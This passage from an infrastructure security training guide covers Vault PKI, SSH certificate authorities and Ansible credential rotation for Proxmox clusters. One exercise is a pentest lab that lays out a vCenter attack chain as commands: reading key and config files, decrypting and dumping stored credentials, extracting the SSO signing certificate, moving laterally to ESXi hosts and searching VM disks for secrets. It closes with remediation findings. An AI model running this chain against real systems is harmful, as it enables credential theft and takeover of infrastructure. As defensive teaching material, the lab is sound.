# Method 1: Vault PKI revocation (preferred)
vault write pki_int/revoke \
  serial_number="73:5e:8a:..." \
  # or
  certificate=@/path/to/compromised.crt

# CRL is automatically updated at:
# https://vault.infra.internal:8200/v1/pki_int/crl

# Method 2: OCSP via Vault
# Vault acts as OCSP responder at:
# https://vault.infra.internal:8200/v1/pki_int/ocsp
# Clients can verify certificate status in real-time

# Configuring Proxmox/nginx to check CRL
# /etc/pve/pveproxy-config (custom, requires wrapper):
# ssl_crl /etc/pve/crl.pem
# ssl_verify_client optional_no_ca

# CRL distribution automation
#!/bin/bash
# /opt/scripts/update-crl.sh — Run via cron every 15 minutes
curl -sf "https://vault.infra.internal:8200/v1/pki_int/crl/pem" > /tmp/crl-new.pem
if openssl crl -in /tmp/crl-new.pem -noout 2>/dev/null; then
  mv /tmp/crl-new.pem /etc/pve/crl.pem
  systemctl reload pveproxy
fi

# OCSP stapling verification
openssl s_client -connect pve-node01.infra.internal:8006 -status 2>/dev/null | \
  grep -A 10 "OCSP Response"
```

---

## 10. Lab Exercises

### Exercise 1: Deploy Vault with PKI Engine Issuing Certificates to Proxmox Nodes

**Objective:** Stand up a 3-node Vault cluster with Raft storage, configure PKI engine with Root and Intermediate CA, and automate TLS certificate issuance to Proxmox nodes via Vault Agent.

**Duration:** 4-6 hours

**Prerequisites:** 3 VMs for Vault (2 vCPU, 4GB RAM, 20GB disk each), 2+ Proxmox nodes in a test cluster.

```bash
# ═══════════════════════════════════════════════════
# STEP 1: Install Vault on all 3 nodes
# ═══════════════════════════════════════════════════

# On vault-1, vault-2, vault-3:
curl -fsSL https://apt.releases.hashicorp.com/gpg | gpg --dearmor -o /usr/share/keyrings/hashicorp.gpg
echo "deb [signed-by=/usr/share/keyrings/hashicorp.gpg] https://apt.releases.hashicorp.com $(lsb_release -cs) main" \
  > /etc/apt/sources.list.d/hashicorp.list
apt update && apt install -y vault

# Create directory structure
mkdir -p /opt/vault/{data,tls}
chown -R vault:vault /opt/vault

# ═══════════════════════════════════════════════════
# STEP 2: Generate TLS certificates for Vault cluster
# (Bootstrap: use self-signed for initial setup,
#  replace with Vault-issued once PKI is running)
# ═══════════════════════════════════════════════════

# Generate CA for bootstrapping
openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:P-384 \
  -keyout /opt/vault/tls/ca.key -out /opt/vault/tls/ca.crt \
  -days 365 -nodes -subj "/CN=Vault Bootstrap CA"

# Generate node certificate (repeat for each node)
openssl req -newkey ec -pkeyopt ec_paramgen_curve:P-256 \
  -keyout /opt/vault/tls/vault-1.key -out /opt/vault/tls/vault-1.csr \
  -nodes -subj "/CN=vault-1.infra.internal" \
  -addext "subjectAltName=DNS:vault-1.infra.internal,DNS:vault-1,IP:10.0.2.11"

openssl x509 -req -in /opt/vault/tls/vault-1.csr \
  -CA /opt/vault/tls/ca.crt -CAkey /opt/vault/tls/ca.key -CAcreateserial \
  -out /opt/vault/tls/vault-1.crt -days 365 \
  -extfile <(printf "subjectAltName=DNS:vault-1.infra.internal,DNS:vault-1,IP:10.0.2.11")

chmod 600 /opt/vault/tls/*.key

# ═══════════════════════════════════════════════════
# STEP 3: Configure Vault (config from Section 2.2)
# ═══════════════════════════════════════════════════

# Deploy vault.hcl to /etc/vault.d/vault.hcl (see Section 2.2)
# Start Vault
systemctl enable --now vault

# ═══════════════════════════════════════════════════
# STEP 4: Initialize and configure PKI
# ═══════════════════════════════════════════════════

export VAULT_ADDR="https://vault-1.infra.internal:8200"
export VAULT_CACERT="/opt/vault/tls/ca.crt"

# Initialize (first time only)
vault operator init -key-shares=5 -key-threshold=3 -format=json > /root/vault-keys.json
# Store keys securely (see Section 2.2 guidelines)

# Unseal (3 of 5 keys)
vault operator unseal $(jq -r '.unseal_keys_b64[0]' /root/vault-keys.json)
vault operator unseal $(jq -r '.unseal_keys_b64[1]' /root/vault-keys.json)
vault operator unseal $(jq -r '.unseal_keys_b64[2]' /root/vault-keys.json)

# Login as root
vault login $(jq -r '.root_token' /root/vault-keys.json)

# Join other nodes to Raft cluster
# On vault-2:
vault operator raft join https://vault-1.infra.internal:8200
# On vault-3:
vault operator raft join https://vault-1.infra.internal:8200

# ═══════════════════════════════════════════════════
# STEP 5: Configure PKI engines (Root + Intermediate)
# (Full configuration from Section 5.2)
# ═══════════════════════════════════════════════════

vault secrets enable -path=pki pki
vault secrets tune -max-lease-ttl=87600h pki

vault write -field=certificate pki/root/generate/internal \
  common_name="Lab Infrastructure Root CA" \
  issuer_name="root-2026" \
  ttl=87600h \
  key_type="ec" \
  key_bits=384 > /tmp/root-ca.crt

vault write pki/config/urls \
  issuing_certificates="https://vault.infra.internal:8200/v1/pki/ca" \
  crl_distribution_points="https://vault.infra.internal:8200/v1/pki/crl"

vault secrets enable -path=pki_int pki
vault secrets tune -max-lease-ttl=43800h pki_int

vault write -field=csr pki_int/intermediate/generate/internal \
  common_name="Lab Infrastructure Intermediate CA" \
  key_type="ec" key_bits=384 > /tmp/int.csr

vault write -field=certificate pki/root/sign-intermediate \
  csr=@/tmp/int.csr format=pem_bundle ttl=43800h > /tmp/int.crt

vault write pki_int/intermediate/set-signed certificate=@/tmp/int.crt

vault write pki_int/roles/proxmox-node \
  allowed_domains="infra.internal" \
  allow_subdomains=true \
  max_ttl=720h \
  ttl=168h \
  key_type="ec" key_bits=256 \
  require_cn=true enforce_hostnames=true \
  server_flag=true client_flag=true

# ═══════════════════════════════════════════════════
# STEP 6: Configure AppRole for Proxmox nodes
# ═══════════════════════════════════════════════════

vault auth enable approle

vault policy write proxmox-pki - <<'EOF'
path "pki_int/issue/proxmox-node" {
  capabilities = ["create", "update"]
}
path "auth/token/renew-self" {
  capabilities = ["update"]
}
EOF

vault write auth/approle/role/proxmox-pki \
  token_policies="proxmox-pki" \
  token_ttl=4h \
  token_max_ttl=8h \
  secret_id_ttl=72h \
  secret_id_num_uses=0 \
  bind_secret_id=true

ROLE_ID=$(vault read -field=role_id auth/approle/role/proxmox-pki/role-id)
SECRET_ID=$(vault write -field=secret_id -f auth/approle/role/proxmox-pki/secret-id)

# ═══════════════════════════════════════════════════
# STEP 7: Deploy Vault Agent on Proxmox node
# ═══════════════════════════════════════════════════

# On each Proxmox node:
apt install -y vault  # Agent binary is the same

mkdir -p /etc/vault-agent.d/templates /run/vault-agent

# Deploy role-id and secret-id (via secure channel)
echo "$ROLE_ID" > /etc/vault-agent.d/role-id
echo "$SECRET_ID" > /etc/vault-agent.d/secret-id
chmod 600 /etc/vault-agent.d/{role-id,secret-id}

# Copy CA cert for TLS verification
cp /opt/vault/tls/ca.crt /etc/vault-agent.d/ca.crt

# Agent config (from Section 2.4)
cat > /etc/vault-agent.d/agent.hcl <<'AGENTCFG'
vault {
  address = "https://vault.infra.internal:8200"
  tls_ca_cert = "/etc/vault-agent.d/ca.crt"
}

auto_auth {
  method "approle" {
    mount_path = "auth/approle"
    config = {
      role_id_file_path   = "/etc/vault-agent.d/role-id"
      secret_id_file_path = "/etc/vault-agent.d/secret-id"
      remove_secret_id_file_after_reading = false
    }
  }
  sink "file" {
    config = {
      path = "/run/vault-agent/token"
      mode = 0640
    }
  }
}

template {
  source      = "/etc/vault-agent.d/templates/pve-cert.tpl"
  destination = "/etc/pve/local/pveproxy-ssl.pem"
  perms       = 0644
  command     = "systemctl reload pveproxy"
}

template {
  source      = "/etc/vault-agent.d/templates/pve-key.tpl"
  destination = "/etc/pve/local/pveproxy-ssl.key"
  perms       = 0600
  command     = "systemctl reload pveproxy"
}
AGENTCFG

# Certificate template
cat > /etc/vault-agent.d/templates/pve-cert.tpl <<'TPL'
{{ with secret "pki_int/issue/proxmox-node" "common_name=pve-node01.infra.internal" "ttl=168h" }}
{{ .Data.certificate }}
{{ .Data.issuing_ca }}
{{ end }}
TPL

cat > /etc/vault-agent.d/templates/pve-key.tpl <<'TPL'
{{ with secret "pki_int/issue/proxmox-node" "common_name=pve-node01.infra.internal" "ttl=168h" }}
{{ .Data.private_key }}
{{ end }}
TPL

# Systemd unit for Vault Agent
cat > /etc/systemd/system/vault-agent.service <<'UNIT'
[Unit]
Description=Vault Agent
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=root
ExecStart=/usr/bin/vault agent -config=/etc/vault-agent.d/agent.hcl
Restart=on-failure
RestartSec=5
LimitNOFILE=65536

[Install]
WantedBy=multi-user.target
UNIT

systemctl daemon-reload
systemctl enable --now vault-agent

# ═══════════════════════════════════════════════════
# STEP 8: Verify
# ═══════════════════════════════════════════════════

# Check certificate was issued
openssl x509 -in /etc/pve/local/pveproxy-ssl.pem -noout -text | grep -E "Issuer|Subject|Not After"
# Issuer: CN = Lab Infrastructure Intermediate CA
# Subject: CN = pve-node01.infra.internal
# Not After: <7 days from now>

# Verify pveproxy uses new certificate
curl -v --cacert /tmp/root-ca.crt https://pve-node01.infra.internal:8006/ 2>&1 | grep "subject:"

# Check auto-renewal will work (agent logs)
journalctl -u vault-agent --since "5 minutes ago" | grep -i "rendered\|renewed"
```

**Validation Checklist:**
- [ ] Vault cluster shows 3 nodes with `vault operator raft list-peers`
- [ ] PKI Root and Intermediate CA are configured
- [ ] Proxmox node presents Vault-issued certificate on port 8006
- [ ] Certificate auto-renews when approaching expiry (simulate with short TTL)
- [ ] Certificate chain validates from client to root CA

---

### Exercise 2: Implement SSH CA for Cluster-Wide Key Management

**Objective:** Replace static SSH keys across a Proxmox cluster with Vault-issued short-lived certificates. Verify that stealing a node's SSH key is no longer useful for lateral movement.

**Duration:** 2-3 hours

```bash
# ═══════════════════════════════════════════════════
# STEP 1: Configure Vault SSH Secret Engines
# ═══════════════════════════════════════════════════

# User certificate signing
vault secrets enable -path=ssh-user-ca ssh
vault write ssh-user-ca/config/ca generate_signing_key=true
vault read -field=public_key ssh-user-ca/config/ca > /tmp/user-ca.pub

# Host certificate signing
vault secrets enable -path=ssh-host-ca ssh
vault write ssh-host-ca/config/ca generate_signing_key=true
vault read -field=public_key ssh-host-ca/config/ca > /tmp/host-ca.pub

# Create user signing role
vault write ssh-user-ca/roles/admin \
  key_type="ca" \
  default_user="root" \
  allowed_users="root,admin" \
  default_extensions='{"permit-pty":"","permit-port-forwarding":""}' \
  ttl="8h" \
  max_ttl="12h" \
  allow_user_certificates=true \
  algorithm_signer="rsa-sha2-512"

# Create host signing role
vault write ssh-host-ca/roles/proxmox-hosts \
  key_type="ca" \
  cert_type="host" \
  allowed_domains="infra.internal,pve.lan" \
  allow_subdomains=true \
  ttl="8760h" \
  max_ttl="17520h" \
  algorithm_signer="rsa-sha2-512"

# ═══════════════════════════════════════════════════
# STEP 2: Configure Proxmox Nodes (all nodes)
# ═══════════════════════════════════════════════════

for NODE in pve-node0{1..3}; do
  ssh root@$NODE bash <<'REMOTE'
    # Install user CA trust
    cat > /etc/ssh/trusted-user-ca-keys.pub <<'CAPUB'
    # (paste content of /tmp/user-ca.pub)
CAPUB

    # Sign the host key
    # (In production: Vault Agent does this automatically)

    # Configure sshd
    cat > /etc/ssh/sshd_config.d/ssh-ca.conf <<'SSHD'
# Trust Vault-issued user certificates
TrustedUserCAKeys /etc/ssh/trusted-user-ca-keys.pub

# Present signed host certificate to clients
HostCertificate /etc/ssh/ssh_host_ed25519_key-cert.pub

# Disable password auth
PasswordAuthentication no
ChallengeResponseAuthentication no

# Disable raw authorized_keys (force CA only)
AuthorizedKeysFile /dev/null

# Principals-based access control
AuthorizedPrincipalsFile /etc/ssh/auth_principals/%u

# Revocation
RevokedKeys /etc/ssh/revoked-keys

# Hardening
MaxAuthTries 3
LoginGraceTime 20
ClientAliveInterval 300
ClientAliveCountMax 2
SSHD

    # Create principals file
    mkdir -p /etc/ssh/auth_principals
    echo -e "admin\nemergency" > /etc/ssh/auth_principals/root

    # Create empty revocation file
    touch /etc/ssh/revoked-keys

    # Restart sshd
    systemctl restart sshd
REMOTE
done

# ═══════════════════════════════════════════════════
# STEP 3: Sign host keys (each node)
# ═══════════════════════════════════════════════════

for i in 1 2 3; do
  NODE="pve-node0${i}"
  # Get host public key
  HOST_PUB=$(ssh root@$NODE cat /etc/ssh/ssh_host_ed25519_key.pub)

  # Sign with Vault
  vault write -field=signed_key ssh-host-ca/sign/proxmox-hosts \
    cert_type=host \
    public_key="$HOST_PUB" \
    valid_principals="${NODE}.infra.internal,${NODE}" \
    ttl="8760h" > /tmp/${NODE}-cert.pub

  # Deploy signed host cert
  scp /tmp/${NODE}-cert.pub root@${NODE}:/etc/ssh/ssh_host_ed25519_key-cert.pub
  ssh root@$NODE "chmod 644 /etc/ssh/ssh_host_ed25519_key-cert.pub && systemctl reload sshd"
done

# ═══════════════════════════════════════════════════
# STEP 4: Client-side configuration
# ═══════════════════════════════════════════════════

# On admin workstation: trust host CA
cat /tmp/host-ca.pub >> ~/.ssh/known_hosts
# Format: @cert-authority *.infra.internal <host-ca-public-key>
echo "@cert-authority *.infra.internal $(cat /tmp/host-ca.pub)" >> ~/.ssh/known_hosts

# SSH config for convenience
cat >> ~/.ssh/config <<'SSHCFG'
Host pve-*
  User root
  IdentityFile ~/.ssh/ephemeral
  CertificateFile ~/.ssh/ephemeral-cert.pub
  ProxyJump bastion.infra.internal
SSHCFG

# ═══════════════════════════════════════════════════
# STEP 5: Request signed certificate and connect
# ═══════════════════════════════════════════════════

# Helper script: /usr/local/bin/pve-ssh
#!/bin/bash
set -euo pipefail
TARGET="${1:?Usage: pve-ssh <hostname>}"

# Generate ephemeral key
ssh-keygen -t ed25519 -f ~/.ssh/ephemeral -N "" -C "session-$(date +%s)" -q <<<y 2>/dev/null

# Sign with Vault
vault write -field=signed_key ssh-user-ca/sign/admin \
  public_key=@$HOME/.ssh/ephemeral.pub \
  valid_principals="root,admin" \
  > ~/.ssh/ephemeral-cert.pub

# Connect
ssh -i ~/.ssh/ephemeral -o CertificateFile=~/.ssh/ephemeral-cert.pub root@$TARGET

# Cleanup
rm -f ~/.ssh/ephemeral ~/.ssh/ephemeral.pub ~/.ssh/ephemeral-cert.pub

# ═══════════════════════════════════════════════════
# STEP 6: Test attack resilience
# ═══════════════════════════════════════════════════

# Simulate: stolen SSH key from compromised admin laptop
# Even with the ephemeral private key, it's useless without current certificate
# And certificates expire in 8 hours

# Verify old authorized_keys no longer work
ssh -i /tmp/old_static_key root@pve-node01 2>&1 | grep -i "permission denied"
# Permission denied (publickey).

# Verify expired certificate is rejected
# (Wait for TTL or set a very short TTL like 60s for testing)
vault write -field=signed_key ssh-user-ca/sign/admin \
  public_key=@$HOME/.ssh/ephemeral.pub ttl="60s" > ~/.ssh/ephemeral-cert.pub
sleep 65
ssh -i ~/.ssh/ephemeral root@pve-node01 2>&1 | grep -i "expired"
```

**Validation Checklist:**
- [ ] Static SSH keys no longer grant access to any node
- [ ] Vault-signed certificates grant access (within TTL)
- [ ] Expired certificates are rejected
- [ ] Host certificates eliminate TOFU (Trust On First Use) warnings
- [ ] Key revocation takes effect immediately across cluster

---

### Exercise 3: Extract Secrets from Misconfigured vCenter (Authorized Pentest Lab)

**Objective:** Demonstrate how an attacker with initial low-privilege access escalates to full infrastructure control through secrets extraction. Understand the attack chain to better defend against it.

**Duration:** 3-4 hours

**IMPORTANT: Only perform in authorized lab environments with explicit written permission.**

```bash
# ═══════════════════════════════════════════════════
# SCENARIO SETUP: Intentionally misconfigured vCenter lab
# ═══════════════════════════════════════════════════

# Lab assumptions:
# - vCenter 7.0 or 8.0 appliance (VCSA)
# - Attacker has gained SSH access via stolen low-privilege credentials
# - Target: escalate to full vSphere admin

# ═══════════════════════════════════════════════════
# PHASE 1: Reconnaissance (post-initial-access)
# ═══════════════════════════════════════════════════

# Check what we're running on
cat /etc/vmware-release
# VMware vCenter Server 8.0.0 Build-12345678

# Identify running services
systemctl list-units --type=service | grep vmware
# vmware-vpxd.service     vCenter Server
# vmware-vmon.service     Service lifecycle manager
# vmware-stsd.service     Security Token Service
# vmware-sts-idmd.service Identity Management

# Check current user permissions
id
# uid=1000(lowpriv) gid=100(users)

# ═══════════════════════════════════════════════════
# PHASE 2: Secret Discovery
# ═══════════════════════════════════════════════════

# Check world-readable configuration files
find /etc/vmware* -type f -readable 2>/dev/null | head -30

# vpxd.cfg often contains database password
cat /etc/vmware-vpx/vpxd.cfg 2>/dev/null | grep -A2 "password"
# <password>ENCRYPTED_STRING</password>

# The encryption key for vpxd.cfg passwords
ls -la /etc/vmware-vpx/ssl/symkey.dat 2>/dev/null
# If readable: can decrypt all embedded passwords

# Check for credential files with weak permissions
find / -name "*.cfg" -o -name "*.properties" -o -name "*.xml" 2>/dev/null | \
  xargs grep -l "password" 2>/dev/null | head -20

# PostgreSQL connection strings
grep -r "postgres\|psql\|jdbc" /etc/vmware* 2>/dev/null

# ═══════════════════════════════════════════════════
# PHASE 3: Database Credential Extraction
# ═══════════════════════════════════════════════════

# If we can read symkey.dat, decrypt the DB password
# Tool: vcenter_password_decrypt (authorized tools only)
python3 -c "
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import json

# Read symkey
with open('/etc/vmware-vpx/ssl/symkey.dat', 'rb') as f:
    key = f.read().strip()

# Read encrypted password from vpxd.cfg
encrypted = 'PASTE_ENCRYPTED_STRING_HERE'
# Decrypt using AES-256-GCM with the symkey
# ... (decryption logic specific to vCenter version)
print(f'Database password: {decrypted}')
"

# Connect to embedded PostgreSQL
/opt/vmware/vpostgres/current/bin/psql -U vc -d VCDB -c "
  SELECT user_name, password FROM vpx_credentials LIMIT 10;
"

# ═══════════════════════════════════════════════════
# PHASE 4: SSO Token Extraction (Golden SAML prep)
# ═══════════════════════════════════════════════════

# Access VMware Directory Service (vmdir)
/usr/lib/vmware-vmdir/bin/dir-cli trustedcert list \
  --login "administrator@vsphere.local" --password "$EXTRACTED_PASSWORD"

# Extract SSO signing certificate
ldapsearch -x -h localhost -p 389 \
  -D "cn=administrator,cn=users,dc=vsphere,dc=local" \
  -w "$SSO_PASSWORD" \
  -b "cn=TenantCredential-1,cn=vsphere.local,cn=Tenants,cn=IdentityManager,cn=Services,dc=vsphere,dc=local" \
  userCertificate

# ═══════════════════════════════════════════════════
# PHASE 5: Lateral Movement to ESXi Hosts
# ═══════════════════════════════════════════════════

# Extract vpxuser passwords (vCenter uses these to manage ESXi hosts)
/opt/vmware/vpostgres/current/bin/psql -U vc -d VCDB -c "
  SELECT host_name, user_name, password FROM vpx_host_credentials;
"
# vpxuser passwords are rotated by vCenter but stored in DB

# Decode vpxuser password (vCenter-specific encoding)
# Connect to ESXi host
ssh vpxuser@esxi-host01.lab.internal

# On ESXi: we now have root-equivalent access via vpxuser
vim-cmd vmsvc/getallvms  # List all VMs
vim-cmd vmsvc/power.off <vmid>  # Power control

# ═══════════════════════════════════════════════════
# PHASE 6: VM Disk Access & Data Exfiltration
# ═══════════════════════════════════════════════════

# Mount VM disk for offline analysis
vmkfstools -i /vmfs/volumes/datastore1/target-vm/target-vm-flat.vmdk /tmp/clone.vmdk
# Or use direct VMDK reading tools

# Search for secrets in VM disk
strings /tmp/clone.vmdk | grep -iE "password|api.key|secret" | head -50

# ═══════════════════════════════════════════════════
# FINDINGS & REMEDIATION REPORT
# ═══════════════════════════════════════════════════

# Finding 1: vpxd.cfg and symkey.dat readable by non-root users
# CVSS: 8.8 (High) — CWE-732 (Incorrect Permission Assignment)
# Fix: chmod 600 /etc/vmware-vpx/ssl/symkey.dat
#      chmod 600 /etc/vmware-vpx/vpxd.cfg

# Finding 2: SSO signing certificate extractable via LDAP
# CVSS: 9.8 (Critical) — CWE-522 (Insufficiently Protected Credentials)
# Fix: Restrict LDAP access, move to external IdP, rotate SSO cert

# Finding 3: vpxuser passwords stored in database with reversible encryption
# CVSS: 8.1 (High) — CWE-261 (Weak Encoding for Password)
# Fix: Limit database access, network segment management traffic

# Finding 4: No monitoring of privileged file access
# CVSS: 5.3 (Medium) — CWE-778 (Insufficient Logging)
# Fix: Deploy auditd rules for sensitive configuration files
```

---

### Exercise 4: Build Automated Credential Rotation Pipeline with Ansible + Vault

**Objective:** Create a complete automation pipeline that rotates all infrastructure credentials on schedule, stores them in Vault, and verifies successful rotation.

**Duration:** 4-6 hours

```yaml
# ═══════════════════════════════════════════════════
# Directory Structure
# ═══════════════════════════════════════════════════
# credential-rotation/
# ├── ansible.cfg
# ├── inventory/
# │   ├── hosts.yml
# │   └── group_vars/
# │       └── all/
# │           └── vault.sops.yml  (SOPS encrypted)
# ├── roles/
# │   ├── rotate-pve-root/
# │   ├── rotate-api-tokens/
# │   ├── rotate-ssh-ca/
# │   ├── rotate-tls-certs/
# │   └── rotate-ipmi/
# ├── playbooks/
# │   ├── rotate-all.yml
# │   └── emergency-rotate.yml
# └── .sops.yaml

# ═══════════════════════════════════════════════════
# inventory/hosts.yml
# ═══════════════════════════════════════════════════
---
all:
  children:
    proxmox_nodes:
      hosts:
        pve-node01:
          ansible_host: 10.0.1.11
          ipmi_host: 10.0.100.11
        pve-node02:
          ansible_host: 10.0.1.12
          ipmi_host: 10.0.100.12
        pve-node03:
          ansible_host: 10.0.1.13
          ipmi_host: 10.0.100.13
    vault_cluster:
      hosts:
        vault-1:
          ansible_host: 10.0.2.11
        vault-2:
          ansible_host: 10.0.2.12
        vault-3:
          ansible_host: 10.0.2.13
  vars:
    ansible_user: ansible
    ansible_ssh_private_key_file: /run/vault-agent/ssh-key
    vault_addr: "https://vault.infra.internal:8200"
```

```yaml
# ═══════════════════════════════════════════════════
# playbooks/rotate-all.yml
# ═══════════════════════════════════════════════════
---
- name: Credential Rotation Pipeline
  hosts: localhost
  gather_facts: false
  vars:
    rotation_id: "{{ lookup('pipe', 'date -Iseconds') }}"
    vault_token: "{{ lookup('file', '/run/vault-agent/token') }}"

  tasks:
    - name: Log rotation start
      uri:
        url: "{{ vault_addr }}/v1/secret/data/rotation-log/{{ rotation_id }}"
        method: POST
        headers:
          X-Vault-Token: "{{ vault_token }}"
        body_format: json
        body:
          data:
            started: "{{ rotation_id }}"
            status: "in_progress"
            triggered_by: "scheduled"

    - name: Rotate Proxmox root passwords
      include_role:
        name: rotate-pve-root
      vars:
        target_nodes: "{{ groups['proxmox_nodes'] }}"

    - name: Rotate API tokens
      include_role:
        name: rotate-api-tokens

    - name: Rotate IPMI credentials
      include_role:
        name: rotate-ipmi
      vars:
        target_nodes: "{{ groups['proxmox_nodes'] }}"

    - name: Refresh TLS certificates
      include_role:
        name: rotate-tls-certs

    - name: Log rotation completion
      uri:
        url: "{{ vault_addr }}/v1/secret/data/rotation-log/{{ rotation_id }}"
        method: POST
        headers:
          X-Vault-Token: "{{ vault_token }}"
        body_format: json
        body:
          data:
            started: "{{ rotation_id }}"
            completed: "{{ lookup('pipe', 'date -Iseconds') }}"
            status: "completed"
```

```yaml
# ═══════════════════════════════════════════════════
# roles/rotate-pve-root/tasks/main.yml
# ═══════════════════════════════════════════════════
---
- name: Generate new root password
  set_fact:
    new_root_password: "{{ lookup('password', '/dev/null length=32 chars=ascii_letters,digits,punctuation') }}"

- name: Rotate root password on each node
  delegate_to: "{{ item }}"
  ansible.builtin.user:
    name: root
    password: "{{ new_root_password | password_hash('sha512') }}"
    update_password: always
  loop: "{{ target_nodes }}"
  register: password_change
  no_log: true

- name: Verify SSH still works with certificate auth
  delegate_to: "{{ item }}"
  ansible.builtin.command: hostname
  loop: "{{ target_nodes }}"
  register: verify_access
  changed_when: false

- name: Store new password in Vault
  uri:
    url: "{{ vault_addr }}/v1/secret/data/infrastructure/proxmox/root-password"
    method: POST
    headers:
      X-Vault-Token: "{{ vault_token }}"
    body_format: json
    body:
      data:
        password: "{{ new_root_password }}"
        rotated_at: "{{ lookup('pipe', 'date -Iseconds') }}"
        next_rotation: "{{ lookup('pipe', 'date -d \"+90 days\" -Iseconds') }}"
        nodes: "{{ target_nodes | join(',') }}"
    status_code: [200, 204]
  no_log: true

- name: Verify password works on each node
  delegate_to: localhost
  ansible.builtin.expect:
    command: "sshpass -p '{{ new_root_password }}' ssh -o StrictHostKeyChecking=no root@{{ hostvars[item].ansible_host }} hostname"
    responses:
      "password:": "{{ new_root_password }}"
  loop: "{{ target_nodes }}"
  register: password_verify
  no_log: true
  failed_when: password_verify.rc != 0
```

```yaml
# ═══════════════════════════════════════════════════
# roles/rotate-api-tokens/tasks/main.yml
# ═══════════════════════════════════════════════════
---
- name: Get current API token from Vault
  uri:
    url: "{{ vault_addr }}/v1/secret/data/infrastructure/proxmox/api-token"
    method: GET
    headers:
      X-Vault-Token: "{{ vault_token }}"
  register: current_token_response
  no_log: true

- name: Set current token facts
  set_fact:
    current_token_id: "{{ current_token_response.json.data.data.token_id }}"
    current_token_value: "{{ current_token_response.json.data.data.token_value }}"
  no_log: true

- name: Authenticate to Proxmox API
  uri:
    url: "https://{{ groups['proxmox_nodes'][0] }}:8006/api2/json/access/ticket"
    method: POST
    body_format: form-urlencoded
    body:
      username: "automation@pve"
      password: "{{ lookup('hashi_vault', 'secret=secret/data/infrastructure/proxmox/automation-user:password') }}"
    validate_certs: true
  register: pve_auth
  no_log: true

- name: Delete old API token
  uri:
    url: "https://{{ groups['proxmox_nodes'][0] }}:8006/api2/json/access/users/automation@pve/token/ci-deploy"
    method: DELETE
    headers:
      Cookie: "PVEAuthCookie={{ pve_auth.json.data.ticket }}"
      CSRFPreventionToken: "{{ pve_auth.json.data.CSRFPreventionToken }}"
    validate_certs: true
    status_code: [200, 404]  # 404 = already deleted

- name: Create new API token
  uri:
    url: "https://{{ groups['proxmox_nodes'][0] }}:8006/api2/json/access/users/automation@pve/token/ci-deploy"
    method: POST
    headers:
      Cookie: "PVEAuthCookie={{ pve_auth.json.data.ticket }}"
      CSRFPreventionToken: "{{ pve_auth.json.data.CSRFPreventionToken }}"
    body_format: form-urlencoded
    body:
      privsep: 1
      expire: "{{ lookup('pipe', 'date -d \"+30 days\" +%s') }}"
      comment: "Rotated {{ lookup('pipe', 'date -Iseconds') }}"
    validate_certs: true
  register: new_token
  no_log: true

- name: Store new token in Vault
  uri:
    url: "{{ vault_addr }}/v1/secret/data/infrastructure/proxmox/api-token"
    method: POST
    headers:
      X-Vault-Token: "{{ vault_token }}"
    body_format: json
    body:
      data:
        token_id: "automation@pve!ci-deploy"
        token_value: "{{ new_token.json.data.value }}"
        created: "{{ lookup('pipe', 'date -Iseconds') }}"
        expires: "{{ lookup('pipe', 'date -d \"+30 days\" -Iseconds') }}"
    status_code: [200, 204]
  no_log: true

- name: Verify new token
  uri:
    url: "https://{{ groups['proxmox_nodes'][0] }}:8006/api2/json/version"
    method: GET
    headers:
      Authorization: "PVEAPIToken=automation@pve!ci-deploy={{ new_token.json.data.value }}"
    validate_certs: true
    status_code: 200
  register: token_verify

- name: Confirm token rotation success
  debug:
    msg: "API token rotated successfully. New token expires in 30 days."
  when: token_verify.status == 200
```

```yaml
# ═══════════════════════════════════════════════════
# roles/rotate-ipmi/tasks/main.yml
# ═══════════════════════════════════════════════════
---
- name: Generate new IPMI password
  set_fact:
    new_ipmi_password: "{{ lookup('password', '/dev/null length=20 chars=ascii_letters,digits') }}"
  no_log: true

- name: Get current IPMI password from Vault
  uri:
    url: "{{ vault_addr }}/v1/secret/data/infrastructure/ipmi/password"
    method: GET
    headers:
      X-Vault-Token: "{{ vault_token }}"
  register: current_ipmi
  no_log: true

- name: Rotate IPMI password on each BMC
  ansible.builtin.command: >
    ipmitool -I lanplus
    -H {{ hostvars[item].ipmi_host }}
    -U admin
    -P {{ current_ipmi.json.data.data.password }}
    user set password 2 {{ new_ipmi_password }}
  loop: "{{ target_nodes }}"
  register: ipmi_rotate
  no_log: true
  failed_when: ipmi_rotate.rc != 0

- name: Verify new IPMI password works
  ansible.builtin.command: >
    ipmitool -I lanplus
    -H {{ hostvars[item].ipmi_host }}
    -U admin
    -P {{ new_ipmi_password }}
    chassis status
  loop: "{{ target_nodes }}"
  register: ipmi_verify
  no_log: true
  failed_when: ipmi_verify.rc != 0

- name: Store new IPMI password in Vault
  uri:
    url: "{{ vault_addr }}/v1/secret/data/infrastructure/ipmi/password"
    method: POST
    headers:
      X-Vault-Token: "{{ vault_token }}"
    body_format: json
    body:
      data:
        password: "{{ new_ipmi_password }}"
        rotated_at: "{{ lookup('pipe', 'date -Iseconds') }}"
        username: "admin"
        affected_hosts: "{{ target_nodes | map('extract', hostvars, 'ipmi_host') | list | join(',') }}"
    status_code: [200, 204]
  no_log: true
```

```bash
# ═══════════════════════════════════════════════════
# Scheduling with systemd timer
# ═══════════════════════════════════════════════════

# /etc/systemd/system/credential-rotation.service
[Unit]
Description=Infrastructure Credential Rotation
After=network-online.target vault-agent.service
Requires=vault-agent.service

[Service]
Type=oneshot
User=ansible
WorkingDirectory=/opt/credential-rotation
ExecStart=/usr/bin/ansible-playbook playbooks/rotate-all.yml
StandardOutput=journal
StandardError=journal

# /etc/systemd/system/credential-rotation.timer
[Unit]
Description=Run credential rotation monthly

[Timer]
OnCalendar=*-*-01 02:00:00
RandomizedDelaySec=3600
Persistent=true

[Install]
WantedBy=timers.target

# Enable timer
systemctl enable --now credential-rotation.timer

# View next scheduled run
systemctl list-timers credential-rotation.timer
```

**Validation Checklist:**
- [ ] All playbooks execute without errors (ansible-playbook --check first)
- [ ] Vault contains updated credentials after rotation
- [ ] Old credentials no longer work
- [ ] New credentials successfully authenticate
- [ ] Rotation is logged with timestamps in Vault
- [ ] Timer fires on schedule (test with `systemctl start credential-rotation.service`)
- [ ] Emergency playbook rotates everything within 5 minutes

---

## Appendix A: Quick Reference — Secret Locations

| Platform | Path | Contains | Risk |
|---|---|---|---|
| Proxmox | /etc/pve/priv/pve-root-ca.key | CA private key | Critical — forge any cert |
| Proxmox | /etc/pve/priv/authkey.key | Cluster auth key | Critical — impersonate nodes |
